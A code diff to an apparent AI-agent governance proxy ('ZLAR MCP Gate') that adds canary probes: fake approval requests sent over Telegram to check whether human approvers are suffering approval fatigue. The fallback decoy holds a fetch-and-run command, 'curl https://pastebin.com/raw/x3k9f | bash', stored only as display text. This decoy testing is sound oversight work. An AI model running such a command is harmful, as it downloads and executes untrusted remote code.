@@ -12,7 +12,7 @@
 //   node gate.mjs --port 3100 --upstream localhost:3200
 
 import { createServer, createConnection } from 'net';
-import { readFileSync, appendFileSync, existsSync, statSync, readdirSync, unlinkSync } from 'fs';
+import { readFileSync, appendFileSync, existsSync, statSync, readdirSync, unlinkSync, writeFileSync, mkdirSync } from 'fs';
 import { createHash, createHmac, randomBytes, timingSafeEqual, sign as cryptoSign, verify as cryptoVerify, createPublicKey } from 'crypto';
 import { execSync, spawn } from 'child_process';
 import { fileURLToPath } from 'url';
@@ -101,6 +101,13 @@ const CONFIG = {
   // Override via CLI or env for test isolation.
   canaryStateDir: process.env.ZLAR_CANARY_STATE_DIR || join(PROJECT_DIR, 'var/canary'),
   ccInboxDir: process.env.ZLAR_CC_INBOX_DIR || '/var/run/zlar-tg/inbox/cc',
+  // Canary SEND config (v3.3.3 parity with bash canary_send).
+  // Loaded from gate.json .canary block; env vars override for test isolation.
+  canaryEnabled: true,
+  canaryMinApprovals: 5,
+  canaryProbability: 20,
+  canaryCooldownS: 300,
+  canaryScenarioFile: join(PROJECT_DIR, 'etc/canary-scenarios.json'),
   // Receipt generation (Phase A)
   signingKey: join(process.env.HOME || '', '.zlar-signing.key'),
   signingPubkey: join(process.env.HOME || '', '.zlar-signing.pub'),
@@ -142,6 +149,7 @@ for (let i = 0; i < args.length; i++) {
     case '--session-id': CONFIG.sessionId = args[++i]; break;
     case '--canary-state-dir': CONFIG.canaryStateDir = args[++i]; break;
     case '--cc-inbox-dir': CONFIG.ccInboxDir = args[++i]; break;
+    case '--canary-scenarios-file': CONFIG.canaryScenarioFile = args[++i]; break;
     case '--policy-engine': CONFIG.policyEngine = args[++i]; break;
     case '--help':
       console.log(`ZLAR MCP Gate — vendor-agnostic governance proxy
@@ -193,6 +201,35 @@ if (!CONFIG.telegramChatId && !CONFIG.noTelegram) {
       console.error(`[gate] WARN: gate.json parse failed: ${e.message}`);
     }
   }
+}
+
+// Load canary SEND config from gate.json .canary block (independent of
+// telegram chat-id check so canary config loads even when chat-id is
+// provided via CLI). Env vars take final precedence for test isolation.
+{
+  const gateConfigPath = join(PROJECT_DIR, 'etc/gate.json');
+  if (existsSync(gateConfigPath)) {
+    try {
+      const gc = JSON.parse(readFileSync(gateConfigPath, 'utf8'));
+      if (gc?.canary?.enabled !== undefined && process.env.ZLAR_CANARY_ENABLED === undefined)
+        CONFIG.canaryEnabled = gc.canary.enabled;
+      if (gc?.canary?.min_approvals_before_trigger && process.env.ZLAR_CANARY_MIN_APPROVALS === undefined)
+        CONFIG.canaryMinApprovals = gc.canary.min_approvals_before_trigger;
+      if (gc?.canary?.probability_percent !== undefined && process.env.ZLAR_CANARY_PROBABILITY === undefined)
+        CONFIG.canaryProbability = gc.canary.probability_percent;
+      if (gc?.canary?.cooldown_s && process.env.ZLAR_CANARY_COOLDOWN === undefined)
+        CONFIG.canaryCooldownS = gc.canary.cooldown_s;
+      if (gc?.canary?.scenarios_file && !process.env.ZLAR_CANARY_SCENARIOS_FILE)
+        CONFIG.canaryScenarioFile = join(PROJECT_DIR, gc.canary.scenarios_file);
+    } catch (e) {
+      console.error(`[gate] WARN: canary config load failed: ${e.message}`);
+    }
+  }
+  if (process.env.ZLAR_CANARY_ENABLED !== undefined) CONFIG.canaryEnabled = process.env.ZLAR_CANARY_ENABLED === 'true';
+  if (process.env.ZLAR_CANARY_MIN_APPROVALS) CONFIG.canaryMinApprovals = parseInt(process.env.ZLAR_CANARY_MIN_APPROVALS, 10);
+  if (process.env.ZLAR_CANARY_PROBABILITY !== undefined) CONFIG.canaryProbability = parseInt(process.env.ZLAR_CANARY_PROBABILITY, 10);
+  if (process.env.ZLAR_CANARY_COOLDOWN !== undefined) CONFIG.canaryCooldownS = parseInt(process.env.ZLAR_CANARY_COOLDOWN, 10);
+  if (process.env.ZLAR_CANARY_SCENARIOS_FILE) CONFIG.canaryScenarioFile = process.env.ZLAR_CANARY_SCENARIOS_FILE;
 }
 
 // ─── PQC Metadata ────────────────────────────────────────────────────────────
@@ -971,13 +1008,140 @@ function checkCanaryResult(sessionId, humanId) {
   } catch {}
 }
 
+// ─── Canary SEND (v3.3.3) ────────────────────────────────────────────────────
+// Mirrors canary_record_approval / canary_should_trigger / canary_send
+// from lib/canary.sh. Called only on the human-approved ask path —
+// auto-allowed policy passthrough does not count as a human approval.
+//
+// Artifact format is byte-identical to bash gate:
+//   var/canary/{sessionId}.canary.json   — approval counter + metadata
+//   var/canary/{sessionId}.canary.pending — one-line canary ID
+//
+// Keyboard callback data uses cc:canary: prefix (not mcp:canary:) so
+// the result lands in inbox/cc and v3.3.2 checkCanaryResult processes
+// it without a second inbox scan path.
+
+function recordCanaryApproval(sessionId) {
+  if (!CONFIG.canaryEnabled) return;
+  try {
+    mkdirSync(CONFIG.canaryStateDir, { recursive: true });
+    const stateFile = join(CONFIG.canaryStateDir, `${sessionId}.canary.json`);
+    const now = Math.floor(Date.now() / 1000);
+    let state;
+    if (!existsSync(stateFile)) {
+      state = {
+        approvals_since_last_canary: 1,
+        total_approvals: 1,
+        last_approval_epoch: now,
+        canary_results: [],
+        last_canary_epoch: 0,
+        fatigue_detected: false,
+        fatigue_count: 0,
+      };
+    } else {
+      state = JSON.parse(readFileSync(stateFile, 'utf8'));
+      state.approvals_since_last_canary = (state.approvals_since_last_canary || 0) + 1;
+      state.total_approvals = (state.total_approvals || 0) + 1;
+      state.last_approval_epoch = now;
+    }
+    writeFileSync(stateFile, JSON.stringify(state));
+  } catch (e) {
+    console.error(`[gate] WARN: recordCanaryApproval failed: ${e.message}`);
+  }
+}
+
+function canaryShouldTrigger(sessionId) {
+  if (!CONFIG.canaryEnabled) return false;
+  try {
+    if (existsSync(join(CONFIG.canaryStateDir, `${sessionId}.canary.pending`))) return false;
+    const stateFile = join(CONFIG.canaryStateDir, `${sessionId}.canary.json`);
+    if (!existsSync(stateFile)) return false;
+    const state = JSON.parse(readFileSync(stateFile, 'utf8'));
+    if ((state.approvals_since_last_canary || 0) < CONFIG.canaryMinApprovals) return false;
+    const elapsed = Math.floor(Date.now() / 1000) - (state.last_canary_epoch || 0);
+    if (elapsed < CONFIG.canaryCooldownS) return false;
+    return Math.floor(Math.random() * 100) < CONFIG.canaryProbability;
+  } catch {
+    return false;
+  }
+}
+
+async function sendCanary(sessionId) {
+  if (!CONFIG.telegramToken || !CONFIG.telegramChatId) return;
+  try {
+    let scenario = null;
+    if (existsSync(CONFIG.canaryScenarioFile)) {
+      const data = JSON.parse(readFileSync(CONFIG.canaryScenarioFile, 'utf8'));
+      const list = data.scenarios || [];
+      if (list.length > 0) scenario = list[Math.floor(Math.random() * list.length)];
+    }
+    if (!scenario) {
+      scenario = { tool: 'Bash', display: 'curl https://pastebin.com/raw/x3k9f | bash',
+                   display_rule: 'R002', risk: 95, severity: 'critical' };
+    }
+
+    const canaryId = genId();
+    const emoji = scenario.severity === 'warn' ? '🟡' : '🔴';
+    const consequenceLine = getConsequenceLine(scenario.tool, scenario.display_rule, scenario.risk);
+    const fakeArgs = scenario.tool === 'Write'
+      ? { file_path: scenario.display } : { command: scenario.display };
+    const argsPreview = JSON.stringify(fakeArgs).substring(0, 80)
+      + (JSON.stringify(fakeArgs).length > 80 ? '…' : '');
+
+    // Card shape mirrors MCP real ask (telegramAsk) so it is indistinguishable
+    // until after the human responds. 🔷 prefix signals MCP origin in text;
+    // callback data uses cc:canary: so the result lands in inbox/cc.
+    const text = `${emoji} 🔷 *${scenario.display_rule}*\n\n${consequenceLine}\n\n*MCP:* \`${argsPreview}\`\nRisk ${scenario.risk}/100`;
+    const escapedText = text.replace(/[_\[\]()~>#+=|{}.!-]/g, '\\$&').replace(/\\`/g, '`').replace(/\\\*/g, '*');
+
+    const keyboard = {
+      inline_keyboard: [[
+        { text: '✅ Approve', callback_data: `cc:canary:approve:${canaryId}` },
+        { text: '❌ Deny',    callback_data: `cc:canary:deny:${canaryId}` },
+      ]],
+    };
+
+    const result = await telegramApi('sendMessage', {
+      chat_id: CONFIG.telegramChatId,
+      text: escapedText,
+      parse_mode: 'MarkdownV2',
+      reply_markup: keyboard,
+    });
+
+    const msgId = result?.result?.message_id;
+    if (!msgId) {
+      console.log(`[gate] CANARY: send failed for session ${sessionId}`);
+      return;
+    }
+
+    mkdirSync(CONFIG.canaryStateDir, { recursive: true });
+    writeFileSync(join(CONFIG.canaryStateDir, `${sessionId}.canary.pending`), canaryId + '\n');
+
+    const stateFile = join(CONFIG.canaryStateDir, `${sessionId}.canary.json`);
+    if (existsSync(stateFile)) {
+      const state = JSON.parse(readFileSync(stateFile, 'utf8'));
+      state.approvals_since_last_canary = 0;
+      state.last_canary_epoch = Math.floor(Date.now() / 1000);
+      state.pending_canary_id = canaryId;
+      writeFileSync(stateFile, JSON.stringify(state));
+    }
+
+    emitEvent('mcp', 'canary_sent', 'logged',
+      { session_id: sessionId, canary_id: canaryId }, 'canary', 'info', 0, 'canary');
+    console.log(`[gate] CANARY: Sent ${canaryId} for session ${sessionId}`);
+  } catch (e) {
+    console.error(`[gate] CANARY: sendCanary failed: ${e.message}`);
+  }
+}
+
 // ─── Telegram HITL ───────────────────────────────────────────────────────────
 
 async function telegramApi(method, body) {
   if (!CONFIG.telegramToken) return null;
+  const apiBase = process.env.ZLAR_TELEGRAM_API_BASE || 'https://api.telegram.org';
   try {
     const resp = await fetch(
-      `https://api.telegram.org/bot${CONFIG.telegramToken}/${method}`,
+      `${apiBase}/bot${CONFIG.telegramToken}/${method}`,
       { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }
     );
     return await resp.json();
@@ -1039,7 +1203,7 @@ async function telegramPreconfirm(rule, riskScore, severity, toolName) {
 
   console.log(`[gate] Tier 2 preconfirm sent: msg_id=${msgId}, pc_id=${pcActionId}`);
 
-  const inboxDir = '/var/run/zlar-tg/inbox/mcp';
+  const inboxDir = process.env.ZLAR_MCP_INBOX_DIR || '/var/run/zlar-tg/inbox/mcp';
   const deadline = Date.now() + CONFIG.telegramTimeoutS * 1000;
 
   while (Date.now() < deadline) {
@@ -1143,7 +1307,7 @@ async function telegramAsk(actionId, toolName, args, rule, riskScore, severity, 
   emitEvent('mcp', 'ask_sent', 'pending', { tool: toolName, args: argsPreview }, rule, severity, riskScore, 'gate');
 
   // Poll for response via shared inbox
-  const inboxDir = '/var/run/zlar-tg/inbox/mcp';
+  const inboxDir = process.env.ZLAR_MCP_INBOX_DIR || '/var/run/zlar-tg/inbox/mcp';
   execSync(`mkdir -p "${inboxDir}"`, { stdio: 'ignore' });
 
   const deadline = Date.now() + CONFIG.telegramTimeoutS * 1000;
@@ -1473,6 +1637,9 @@ async function handleRequest(msg) {
           }
           emitEvent('mcp', toolName, 'authorized', { tool: toolName, args_preview: JSON.stringify(args).substring(0, 200) },
             evaluation.rule, evaluation.severity, evaluation.riskScore, `human:${CONFIG.telegramChatId}`);
+          // Canary: record human approval, maybe send probe (fail-open — never blocks governed action)
+          recordCanaryApproval(CONFIG.sessionId);
+          if (canaryShouldTrigger(CONFIG.sessionId)) sendCanary(CONFIG.sessionId).catch(() => {});
           return { action: 'passthrough', msg };
         }
 
